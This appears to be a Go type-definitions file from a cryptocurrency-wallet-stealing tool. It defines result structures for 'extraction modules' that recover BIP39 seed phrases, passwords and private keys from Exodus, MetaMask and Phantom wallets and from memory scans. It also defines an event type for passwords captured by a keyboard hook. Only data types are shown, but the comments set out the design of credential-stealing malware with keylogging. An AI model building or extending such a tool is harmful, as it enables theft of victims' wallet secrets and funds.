package types

// WalletResult is returned by any extraction module when it finds a seed.
type WalletResult struct {
	Source   string            // "exodus", "metamask", "phantom", "memscan"
	Mnemonic string            // BIP39 seed phrase (12 or 24 words)
	Password string            // The password that worked (if applicable)
	Extra    map[string]string // Module-specific data (e.g., imported private keys)
	Location string            // Where the vault/data was found
}

// PasswordEvent is emitted by the keyboard hook when a password candidate
// is captured. Source indicates which wallet app was in the foreground.
type PasswordEvent struct {
	Password string
	Source   string // "exodus", "metamask", "phantom", "global"
}
